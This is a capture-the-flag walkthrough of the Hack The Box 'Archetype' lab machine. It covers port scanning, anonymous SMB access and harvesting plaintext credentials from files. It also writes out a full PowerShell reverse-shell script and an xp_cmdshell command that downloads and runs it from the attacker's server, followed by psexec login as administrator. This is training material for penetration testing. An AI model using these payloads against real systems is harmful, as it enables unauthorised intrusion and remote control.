---
title: HTB - Archetype Walkthrough
date: 2021-08-08 19:35:10
tags: [WalkThrough, HTB, Penetration Testing, Starting Point]
---

# Enumeration
## Scan for opening ports
```
nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// >> ports.txt

tr: change \n to ,
sed s/,$ replace the last `,` to empty
```
more detailed scan
```
nmap -sC -sV -p`cat ports.txt` 10.10.10.27
```
Results:
```
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s Microsoft SQL Server 2017 
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc        Microsoft Windows RPC
49665/tcp filtered unknown
49667/tcp open     msrpc        Microsoft Windows RPC
49668/tcp open     msrpc        Microsoft Windows RPC
49669/tcp closed   unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
```
Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.
```
445 are open (file sharing smb)

check anonymous login
```
smbclient -N -L \\\\10.10.10.27 
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC

-N: dot not ask for password
-L: list shares
```

```
smbclient -N \\\\10.10.10.27\\backups
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		10328063 blocks of size 4096. 8248806 blocks available
get prod.dtsConfig
```

A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

port 1433 is default port for ms-sql-s

```
mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

```

entered the database

check weather the current user has system level privilege

```
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
              

-----------   

          1 
```

change configuration to make xp_cmdshell available:
https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15

```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

```
xp_cmdshell:
https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15

powershell reverse shell:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

```
reverseshell.ps

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.73',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.73",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

open a webserver for servering the file

```
python3 -m http.server 80

listening for the reverse shell:
nc -vnlp 4242
```

in sql execute:
```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.73/ps_shell2.ps1\");"
```

not sure why the first script get blocked by antivirus software

the flag file stored in :C:\Users\sql_svc\Desktop\user.txt



privilege escalation:

find frequent accessed file or commands:
```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

```

https://en.wikipedia.org/wiki/Net_(command)
```
use: Connect/disconnect computer to/from shared resources, or display information about computer connections

```

connect to the admin user and look at the desktop

```
psexec.py administrator@10.10.10.27

cd C:\Users\administrator\Desktop
```

to use psexec, port445 need to open 

Prerequisites:
- A modern Windows computer (local)
- File and Printer Sharing open (remote computer, TCP port 445)
- The admin$ administrative share available (remote computer)
- You know a local account’s credential (remote computer)